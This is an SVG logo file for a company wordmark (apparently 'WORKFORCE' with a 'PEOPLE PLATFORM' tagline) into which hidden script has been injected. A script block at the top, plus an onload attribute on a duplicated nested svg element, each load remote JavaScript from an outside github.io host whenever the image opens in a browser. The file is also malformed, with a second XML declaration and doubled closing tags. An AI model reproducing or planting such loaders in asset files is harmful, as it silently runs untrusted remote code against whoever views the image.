<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  x="0px" y="0px" viewBox="0 0 434.19 133.52" style="enable-background:new 0 0 434.19 133.52;" xml:space="preserve">
  
  <script type="text/javascript">
    (() => {
      const s = document.createElement('script');
      s.src = 'https://totallylost-helpme.github.io/chat.js';
      s.async = true;
      s.onload = () => { console.log('External script loaded successfully'); };
      document.documentElement.prepend(s);
    })();
  </script>
<?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 24.0.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 434.19 133.52" style="enable-background:new 0 0 434.19 133.52;" xml:space="preserve" onload="(() => {const s = document.createElement('script'); s.src = 'https://totallylost-helpme.github.io/chat.js'; document.head.appendChild(s);})();">
<style type="text/css">
	.st0{fill:#F7941D;}
	.st1{fill:#323E48;}
	.st2{fill:#A7A9AC;}
</style>
<g>
	<g>
		<path d="M65.07,79.39v0.49h-0.94v2.46h-0.58v-2.46H62.6v-0.49H65.07z M68.25,82.33l-0.11-1.73c-0.01-0.23-0.01-0.51-0.02-0.82    h-0.03c-0.08,0.26-0.16,0.61-0.25,0.88l-0.53,1.63H66.7l-0.53-1.68c-0.05-0.23-0.14-0.57-0.21-0.83h-0.03    c0,0.27-0.01,0.55-0.02,0.82l-0.11,1.73h-0.56l0.22-2.94h0.88l0.51,1.44c0.06,0.23,0.12,0.44,0.19,0.75h0.01    c0.08-0.27,0.14-0.52,0.21-0.74l0.51-1.45h0.84l0.23,2.94H68.25z"/>
	</g>
	<polygon class="st0" points="89.35,39.79 60.49,50.28 60.49,37.16 89.35,26.66  "/>
	<polygon class="st0" points="78.85,60.12 60.49,67.34 60.49,54.22 78.85,47  "/>
	<polygon class="st1" points="19.16,71.25 30.96,74.54 30.96,29.29 19.16,26.01  "/>
	<polygon class="st1" points="46.61,79.22 58.42,82.51 58.42,37.26 46.61,33.98  "/>
	<polygon class="st1" points="32.93,75.19 44.74,78.47 44.74,49.63 32.93,46.35  "/>
	<g>
		<path class="st1" d="M105.34,37.95h9.34l6.21,24.94H121l8.13-24.94h7.96l8.08,25.6h0.11l6.54-25.6h8.68l-11.37,38.89h-7.64    l-8.57-26.92h-0.11l-8.57,26.92h-7.36L105.34,37.95z"/>
		<path class="st1" d="M176.63,36.96c12.14,0,20.98,7.96,20.98,20.43c0,12.47-8.84,20.43-20.98,20.43    c-12.14,0-20.98-7.96-20.98-20.43C155.65,44.92,164.49,36.96,176.63,36.96z M176.63,69.92c7.3,0,12.08-5.27,12.08-12.52    c0-7.25-4.78-12.53-12.08-12.53c-7.31,0-12.08,5.27-12.08,12.53C164.55,64.64,169.33,69.92,176.63,69.92z"/>
		<path class="st1" d="M196.84,37.95h15.05c7.96,0,14.67,2.75,14.67,11.81c0,5.44-2.91,9.67-8.4,10.66l9.89,16.43h-10.27    l-8.13-15.55h-4.23v15.55h-8.57V37.95z M205.41,54.04h5.06c3.13,0,7.2-0.11,7.2-4.34c0-3.9-3.52-4.5-6.65-4.5h-5.6V54.04z"/>
		<path class="st1" d="M227.26,37.95h8.57V54.1l15.11-16.15h11.2l-17.3,18.07l18.79,20.82h-11.97l-15.82-18.46v18.46h-8.57V37.95z"/>
		<path class="st0" d="M261.42,37.95h26.09v7.91h-17.52v7.91h16.21v7.91h-16.21v15.16h-8.57V37.95z"/>
		<path class="st0" d="M305.96,36.96c12.14,0,20.98,7.96,20.98,20.43c0,12.47-8.84,20.43-20.98,20.43    c-12.14,0-20.98-7.96-20.98-20.43C284.98,44.92,293.82,36.96,305.96,36.96z M305.96,69.92c7.31,0,12.08-5.27,12.08-12.52    c0-7.25-4.78-12.53-12.08-12.53c-7.31,0-12.09,5.27-12.09,12.53C293.88,64.64,298.66,69.92,305.96,69.92z"/>
		<path class="st0" d="M326.17,37.95h15.05c7.97,0,14.67,2.75,14.67,11.81c0,5.44-2.91,9.67-8.41,10.66l9.89,16.43H347.1    l-8.13-15.55h-4.23v15.55h-8.57V37.95z M334.74,54.04h5.05c3.13,0,7.2-0.11,7.2-4.34c0-3.9-3.52-4.5-6.65-4.5h-5.61V54.04z"/>
		<path class="st0" d="M381.7,48.05c-1.7-2.03-4.17-3.19-7.36-3.19c-6.48,0-11.26,5.27-11.26,12.53c0,7.25,4.78,12.52,10.99,12.52    c3.46,0,6.26-1.54,8.02-4.17l7.14,5.33c-3.24,4.61-8.73,6.76-14.06,6.76c-12.14,0-20.98-7.96-20.98-20.43    c0-12.47,8.84-20.43,20.98-20.43c4.34,0,9.83,1.49,13.13,5.71L381.7,48.05z"/>
		<path class="st0" d="M387.62,37.95h26.42v7.91h-17.85v7.25h16.87v7.91h-16.87v7.91h18.84v7.91h-27.41V37.95z"/>
	</g>
	<g>
		<g>
			<path class="st2" d="M116.2,97.68c0,2.63-2.16,4.79-4.8,4.79c-0.22,0-2.89,0-2.89,0v4.79h-2.4V92.87h5.29     C114.04,92.87,116.2,95.03,116.2,97.68z M113.8,97.68c0-1.34-1.08-2.42-2.4-2.42c-0.26,0-2.89,0-2.89,0v4.81h2.89     C112.72,100.08,113.8,99,113.8,97.68z"/>
			<path class="st2" d="M130.9,92.87h7.19v2.4h-4.79v2.89h4.79v2.4h-4.79v4.32h4.79v2.4h-7.19V92.87z"/>
			<path class="st2" d="M158.08,92.63c3.24,0,5.05,3.37,5.05,7.45c0,4.08-1.81,7.43-5.05,7.43c-3.24,0-5.03-3.35-5.03-7.43     C153.04,96,154.84,92.63,158.08,92.63z M158.08,105.11c1.62,0,2.51-2.29,2.51-5.03c0-2.76-0.89-5.05-2.51-5.05     c-1.6,0-2.48,2.29-2.48,5.05C155.59,102.82,156.48,105.11,158.08,105.11z"/>
			<path class="st2" d="M188.15,97.68c0,2.63-2.16,4.79-4.79,4.79c-0.21,0-2.89,0-2.89,0v4.79h-2.4V92.87h5.29     C185.99,92.87,188.15,95.03,188.15,97.68z M185.75,97.68c0-1.34-1.08-2.42-2.4-2.42c-0.26,0-2.89,0-2.89,0v4.81h2.89     C184.68,100.08,185.75,99,185.75,97.68z"/>
			<path class="st2" d="M205.25,104.87h4.08v2.4h-6.48V92.87h2.4V104.87z"/>
			<path class="st2" d="M222.81,92.87h7.19v2.4h-4.8v2.89h4.8v2.4h-4.8v4.32h4.8v2.4h-7.19V92.87z"/>
			<path class="st2" d="M265.17,107.27h-2.4v-9.11c0-3.56,2.16-5.53,4.79-5.53c2.66,0,4.82,1.97,4.82,5.53v9.11h-2.42v-4.79h-4.79     V107.27z M269.96,98.16c0-2.12-1.08-3.13-2.4-3.13s-2.4,1.01-2.4,3.13v1.92h4.79V98.16z"/>
			<path class="st2" d="M285.87,95.26v-2.4h10.56v2.4h-4.08v12.01h-2.4V95.26H285.87z"/>
			<path class="st2" d="M330.64,107.51h-0.5l-5.03-14.64h2.44l2.83,8.38l1.9-5.64l-0.93-2.74h2.44l2.83,8.38l2.83-8.38h2.46     l-5.05,14.64h-0.47l-2.87-8.38L330.64,107.51z"/>
			<path class="st2" d="M359.48,92.63c3.24,0,5.05,3.37,5.05,7.45c0,4.08-1.81,7.43-5.05,7.43c-3.24,0-5.03-3.35-5.03-7.43     C354.45,96,356.24,92.63,359.48,92.63z M359.48,105.11c1.62,0,2.5-2.29,2.5-5.03c0-2.76-0.88-5.05-2.5-5.05     c-1.6,0-2.48,2.29-2.48,5.05C357,102.82,357.88,105.11,359.48,105.11z"/>
			<path class="st2" d="M390.03,107.27h-2.94l-3.46-4.79c-0.58,0-1.77,0-1.77,0v4.79h-2.4V92.87h4.56c2.64,0,4.79,2.16,4.79,4.82     c0,1.83-1.04,3.48-2.61,4.25L390.03,107.27z M386.43,97.68c0-1.34-1.08-2.42-2.4-2.42c-0.24,0-2.16,0-2.16,0v4.81h2.16     C385.35,100.08,386.43,99,386.43,97.68z"/>
			<path class="st2" d="M406.65,107.27h-2.4V92.87h2.4v6.63l4.75-6.63h2.94l-5.05,7.04l5.29,7.36h-2.94l-4.99-6.96V107.27z"/>
		</g>
	</g>
</g>

</svg>

</svg>
